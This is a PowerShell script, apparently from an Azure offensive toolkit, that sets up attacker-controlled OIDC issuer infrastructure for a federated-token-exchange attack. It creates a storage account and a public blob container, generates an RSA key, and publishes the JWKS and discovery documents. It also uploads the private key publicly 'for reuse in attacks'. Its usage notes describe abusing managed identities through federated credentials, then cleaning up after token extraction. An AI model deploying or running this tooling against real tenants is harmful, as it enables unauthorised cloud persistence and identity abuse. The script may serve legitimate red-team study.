# Setup script for Invoke-FederatedTokenExchange OIDC infrastructure
# Run once to create the storage account and upload OIDC metadata

param (
    [string]$StorageAccountName,
    [string]$ResourceGroupName = "rg-blackcat-oidc",
    [string]$Location = "westus",
    [string]$KeyPath = "./blackcat-oidc.pem"
)

function ConvertTo-Base64Url ([byte[]]$Bytes) {
    [Convert]::ToBase64String($Bytes).
        TrimEnd('=').Replace('+','-').Replace('/','_')
}

function New-SharedKeySignature {
    param (
        [string]$Method, [string]$AccountName,
        [string]$AccountKey, [string]$CanonicalResource,
        [string]$CanonicalHeaders,
        [string]$ContentType = '', [int]$ContentLength = 0
    )

    $len = if ($ContentLength -gt 0) { "$ContentLength" } else { '' }

    $fields = @(
        $Method, '', '', $len, '', $ContentType,
        '', '', '', '', '', '',
        $CanonicalHeaders, $CanonicalResource
    )

    $hmac = [Security.Cryptography.HMACSHA256]::new(
        [Convert]::FromBase64String($AccountKey)
    )
    [Convert]::ToBase64String(
        $hmac.ComputeHash(
            [Text.Encoding]::UTF8.GetBytes($fields -join "`n")
        )
    )
}

# Upload blob with SharedKey
function Upload-Blob {
    param (
        [string]$BlobName,
        [string]$Content,
        [string]$StorageAccount,
        [string]$AccountKey,
        [string]$BlobBase,
        [string]$ContentType = 'application/json'
    )

    $bytes    = [Text.Encoding]::UTF8.GetBytes($Content)
    $date     = [DateTime]::UtcNow.ToString('R')
    $canon    = "x-ms-blob-type:BlockBlob`nx-ms-date:$date`nx-ms-version:2021-06-08"
    $resource = "/$StorageAccount/oidc/$BlobName"

    $sig = New-SharedKeySignature -Method 'PUT' `
        -AccountName $StorageAccount -AccountKey $AccountKey `
        -CanonicalResource $resource -CanonicalHeaders $canon `
        -ContentType $ContentType -ContentLength $bytes.Length

    $params = @{
        Uri     = "$BlobBase/oidc/$BlobName"
        Method  = 'PUT'
        Body    = $bytes
        Headers = @{
            'x-ms-date'      = $date
            'x-ms-version'   = '2021-06-08'
            'x-ms-blob-type' = 'BlockBlob'
            'Content-Type'   = $ContentType
            'Content-Length'  = $bytes.Length
            'Authorization'  = "SharedKey ${StorageAccount}:$sig"
        }
    }

    try {
        $null = Invoke-RestMethod @params
        return $true
    }
    catch {
        Write-Host "    ERROR: $BlobName - $_" -ForegroundColor Red
        return $false
    }
}

# Authentication
Write-Host "Setting up OIDC infrastructure..." -ForegroundColor Green
Write-Host "(Pure PowerShell — no az CLI or OpenSSL)" -ForegroundColor Gray

try {
    $ctx = Get-AzContext -ErrorAction Stop
    if (-not $ctx) {
        Write-Host "`nNot authenticated. Run:" -ForegroundColor Red
        Write-Host "  Connect-AzAccount" -ForegroundColor Yellow
        exit 1
    }

    $tenantId       = $ctx.Tenant.Id
    $subscriptionId = $ctx.Subscription.Id
    $armUri         = 'https://management.azure.com'

    Write-Host "  Tenant: $tenantId" -ForegroundColor Green
    Write-Host "  Subscription: $subscriptionId" -ForegroundColor Green

    $tok   = Get-AzAccessToken -ResourceUrl $armUri -ErrorAction Stop
    $plain = ConvertFrom-SecureString -SecureString $tok.Token -AsPlainText
    $authHeader = @{
        'Authorization' = "Bearer $plain"
        'Content-Type'  = 'application/json'
    }
}
catch {
    Write-Host "`nFailed to get Azure context: $_" -ForegroundColor Red
    Write-Host "Ensure Az.Accounts is installed and you're authenticated." -ForegroundColor Yellow
    exit 1
}

if (-not (Test-Path $KeyPath)) {
    Write-Host "`n[1/5] Generating RSA-2048 key pair..." -ForegroundColor Cyan

    try {
        $rsa    = [Security.Cryptography.RSA]::Create(2048)
        $keyB64 = [Convert]::ToBase64String($rsa.ExportPkcs8PrivateKey())

        $pemLines = @('-----BEGIN PRIVATE KEY-----')
        for ($i = 0; $i -lt $keyB64.Length; $i += 64) {
            $len = [Math]::Min(64, $keyB64.Length - $i)
            $pemLines += $keyB64.Substring($i, $len)
        }
        $pemLines += '-----END PRIVATE KEY-----'
        $pemLines -join "`n" | Set-Content $KeyPath -NoNewline
        $rsa.Dispose()

        Write-Host "  Private key saved: $KeyPath" -ForegroundColor Green
    }
    catch {
        Write-Host "  Failed to generate RSA key: $_" -ForegroundColor Red
        exit 1
    }
}
else {
    Write-Host "`n[1/5] Using existing key: $KeyPath" -ForegroundColor Cyan
}

Write-Host "`n[2/5] Generating JWKS from private key..." -ForegroundColor Cyan

$pemContent = Get-Content -Path $KeyPath -Raw
$pemClean   = $pemContent -replace '-----(?:BEGIN|END).*-----', '' -replace '\s', ''
$keyBytes   = [Convert]::FromBase64String($pemClean)

$rsa = [Security.Cryptography.RSA]::Create()
try {
    if ($pemContent -match 'BEGIN RSA PRIVATE KEY') {
        $rsa.ImportRSAPrivateKey($keyBytes, [ref]$null)
    } else {
        $rsa.ImportPkcs8PrivateKey($keyBytes, [ref]$null)
    }

    $pub      = $rsa.ExportParameters($false)
    $modulus  = ConvertTo-Base64Url -Bytes $pub.Modulus
    $exponent = ConvertTo-Base64Url -Bytes $pub.Exponent
    $keyId    = [guid]::NewGuid().ToString()

    $jwks = @{
        keys = @(@{
            kty = 'RSA'; use = 'sig'; alg = 'RS256'
            kid = $keyId; n = $modulus; e = $exponent
        })
    } | ConvertTo-Json -Depth 5 -Compress

    $jwks | Out-File './jwks.json' -Encoding utf8 -NoNewline
    Write-Host "  JWKS saved: ./jwks.json (kid: $keyId)" -ForegroundColor Green
}
finally { $rsa.Dispose() }

Write-Host "`n[3/5] Creating Azure Storage account..." -ForegroundColor Cyan

if (-not $StorageAccountName) {
    $chars = (97..122) + (48..57) | Get-Random -Count 8
    $suffix = -join ($chars | ForEach-Object { [char]$_ })
    $StorageAccountName = "bcoidc$suffix"
}

Write-Host "  Storage account: $StorageAccountName" -ForegroundColor White

# Create resource group
$rgUri = ("$armUri/subscriptions/$subscriptionId" +
    "/resourceGroups/${ResourceGroupName}?api-version=2021-04-01")

Write-Host "  Checking resource group: $ResourceGroupName" -ForegroundColor Yellow

try {
    $null = Invoke-RestMethod -Uri $rgUri -Headers $authHeader -Method GET -ErrorAction SilentlyContinue
    Write-Host "    Resource group exists" -ForegroundColor Green
}
catch {
    if ($_.Exception.Response.StatusCode -eq 404) {
        Write-Host "    Creating resource group..." -ForegroundColor Yellow
        $body = @{ location = $Location } | ConvertTo-Json
        $null = Invoke-RestMethod -Uri $rgUri -Headers $authHeader -Method PUT -Body $body -ContentType 'application/json'
        Write-Host "    Resource group created" -ForegroundColor Green
    }
    else {
        Write-Host "  ERROR: Failed to check resource group: $_" -ForegroundColor Red
        exit 1
    }
}

# Create storage account
$storageApi = '2023-05-01'
$storageUri = ("$armUri/subscriptions/$subscriptionId" +
    "/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage" +
    "/storageAccounts/${StorageAccountName}?api-version=$storageApi")

Write-Host "  Creating storage account..." -ForegroundColor Yellow

$storageBody = @{
    kind     = 'StorageV2'
    location = $Location
    sku      = @{ name = 'Standard_LRS' }
    properties = @{
        allowBlobPublicAccess    = $true
        minimumTlsVersion        = 'TLS1_2'
        supportsHttpsTrafficOnly = $true
    }
} | ConvertTo-Json -Depth 5

$storageParams = @{
    Uri         = $storageUri
    Headers     = $authHeader
    Method      = 'PUT'
    Body        = $storageBody
    ContentType = 'application/json'
}

try {
    $null = Invoke-RestMethod @storageParams
    Write-Host "  Waiting for provisioning..." -ForegroundColor Yellow

    for ($i = 1; $i -le 30; $i++) {
        Start-Sleep -Seconds 2
        $s = Invoke-RestMethod -Uri $storageUri -Headers $authHeader -Method GET
        if ($s.properties.provisioningState -eq 'Succeeded') {
            Write-Host "    Storage account ready" -ForegroundColor Green
            break
        }
        if ($i -eq 30) {
            Write-Host "  Provisioning timeout" -ForegroundColor Red
            exit 1
        }
    }
}
catch {
    Write-Host "  Failed to create storage: $_" -ForegroundColor Red
    Write-Host "    $($_.ErrorDetails.Message)" -ForegroundColor Gray
    exit 1
}

# Get storage account keys
$keysUri = ("$armUri/subscriptions/$subscriptionId" +
    "/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage" +
    "/storageAccounts/$StorageAccountName/listKeys?api-version=$storageApi")

try {
    $keys = Invoke-RestMethod -Uri $keysUri -Headers $authHeader -Method POST
    $accountKey = $keys.keys[0].value
}
catch {
    Write-Host "  Failed to get storage keys: $_" -ForegroundColor Red
    exit 1
}

# Create blob container with public access
$blobBase     = "https://${StorageAccountName}.blob.core.windows.net"
$containerUri = "$blobBase/oidc?restype=container"

Write-Host "  Creating blob container: oidc (public access)" -ForegroundColor Yellow

$date          = [DateTime]::UtcNow.ToString('R')
$canonHeaders  = "x-ms-blob-public-access:blob`nx-ms-date:$date`nx-ms-version:2021-06-08"
$canonResource = "/$StorageAccountName/oidc`nrestype:container"

$sig = New-SharedKeySignature -Method 'PUT' `
    -AccountName $StorageAccountName -AccountKey $accountKey `
    -CanonicalResource $canonResource -CanonicalHeaders $canonHeaders

$containerParams = @{
    Uri     = $containerUri
    Method  = 'PUT'
    Headers = @{
        'x-ms-date'               = $date
        'x-ms-version'            = '2021-06-08'
        'x-ms-blob-public-access' = 'blob'
        'Authorization'           = "SharedKey ${StorageAccountName}:$sig"
    }
}

try {
    $null = Invoke-RestMethod @containerParams
    Write-Host "    Container created" -ForegroundColor Green
}
catch {
    if ($_.Exception.Response.StatusCode -eq 409) {
        Write-Host "    Container already exists" -ForegroundColor Green
    }
    else {
        Write-Host "  WARNING: Container: $($_.Exception.Response.StatusCode)" -ForegroundColor Yellow
    }
}

$issuerUrl = "https://${StorageAccountName}.blob.core.windows.net/oidc"
Write-Host "  Issuer URL: $issuerUrl" -ForegroundColor Green

Write-Host "`n[4/5] Creating OIDC discovery document..." -ForegroundColor Cyan

$discovery = @{
    issuer                                = $issuerUrl
    jwks_uri                              = "$issuerUrl/jwks"
    response_types_supported              = @('id_token')
    subject_types_supported               = @('public')
    id_token_signing_alg_values_supported = @('RS256')
} | ConvertTo-Json -Compress

$discovery | Out-File './openid-configuration' -Encoding utf8 -NoNewline
Write-Host "  Discovery document saved: ./openid-configuration" -ForegroundColor Green

Write-Host "`n[5/5] Uploading OIDC metadata to blob storage..." -ForegroundColor Cyan

$jwksContent = Get-Content './jwks.json' -Raw
Write-Host "  Uploading jwks..." -ForegroundColor Yellow
if (Upload-Blob -BlobName 'jwks' -Content $jwksContent `
    -StorageAccount $StorageAccountName -AccountKey $accountKey -BlobBase $blobBase) {
    Write-Host "    jwks uploaded" -ForegroundColor Green
}

$configContent = Get-Content './openid-configuration' -Raw
Write-Host "  Uploading .well-known/openid-configuration..." -ForegroundColor Yellow
if (Upload-Blob -BlobName '.well-known/openid-configuration' -Content $configContent `
    -StorageAccount $StorageAccountName -AccountKey $accountKey -BlobBase $blobBase) {
    Write-Host "    Discovery document uploaded" -ForegroundColor Green
}

# Upload private key for attack scenario reuse
$pemContent = Get-Content $KeyPath -Raw
Write-Host "  Uploading blackcat-oidc.pem (for reuse in attacks)..." -ForegroundColor Yellow
if (Upload-Blob -BlobName 'blackcat-oidc.pem' -Content $pemContent -ContentType 'application/x-pem-file' `
    -StorageAccount $StorageAccountName -AccountKey $accountKey -BlobBase $blobBase) {
    Write-Host "    Private key uploaded" -ForegroundColor Green
}

Write-Host "`n✓ Setup complete!" -ForegroundColor Green
Write-Host "Verifying anonymous access..." -ForegroundColor Cyan

try {
    $jwksTest = Invoke-RestMethod "$issuerUrl/jwks" -ErrorAction Stop
    Write-Host "  ✓ JWKS accessible (kid: $($jwksTest.keys[0].kid))" -ForegroundColor Green

    $disc = Invoke-RestMethod "$issuerUrl/.well-known/openid-configuration" -ErrorAction Stop
    Write-Host "  ✓ Discovery doc accessible" -ForegroundColor Green
    Write-Host "    Issuer:   $($disc.issuer)" -ForegroundColor Gray
    Write-Host "    JWKS URI: $($disc.jwks_uri)" -ForegroundColor Gray

    $keyTest = Invoke-RestMethod "$issuerUrl/blackcat-oidc.pem" -ErrorAction Stop
    Write-Host "  ✓ Private key accessible (attack reuse enabled)" -ForegroundColor Green
}
catch {
    Write-Host "  ⚠ Verification failed: $_" -ForegroundColor Yellow
    Write-Host "  Wait 30s, then: Invoke-RestMethod '$issuerUrl/jwks'" -ForegroundColor Yellow
}

# ── Usage instructions ───────────────────────────────────────────
$div = '─' * 70
Write-Host "`n$div" -ForegroundColor Gray
Write-Host 'Usage Example:' -ForegroundColor Cyan
Write-Host @"

Invoke-FederatedTokenExchange ``
    -Name "your-uami-name" ``
    -IssuerUrl "$issuerUrl" ``
    -PrivateKeyPath "$KeyPath" ``
    -Cleanup

"@ -ForegroundColor White

Write-Host 'Local Files:' -ForegroundColor Cyan
Write-Host "  - Private key:   $KeyPath (also uploaded to storage)" -ForegroundColor White
Write-Host '  - JWKS:          ./jwks.json' -ForegroundColor White
Write-Host '  - Discovery doc: ./openid-configuration' -ForegroundColor White

Write-Host "`nAzure Resources:" -ForegroundColor Cyan
Write-Host "  - Subscription:    $subscriptionId" -ForegroundColor White
Write-Host "  - Resource Group:  $ResourceGroupName" -ForegroundColor White
Write-Host "  - Storage Account: $StorageAccountName" -ForegroundColor White
Write-Host '  - Container:       oidc (public blob access)' -ForegroundColor White
Write-Host "  - Issuer URL:      $issuerUrl" -ForegroundColor White

Write-Host "`nNext Steps:" -ForegroundColor Cyan
Write-Host '  1. Invoke-FederatedTokenExchange auto-downloads key from issuer URL' -ForegroundColor White
Write-Host '  2. No need to carry private key file - reusable attack infrastructure' -ForegroundColor White
Write-Host '  3. Use -Cleanup to remove FICs after extraction' -ForegroundColor White
Write-Host $div -ForegroundColor Gray
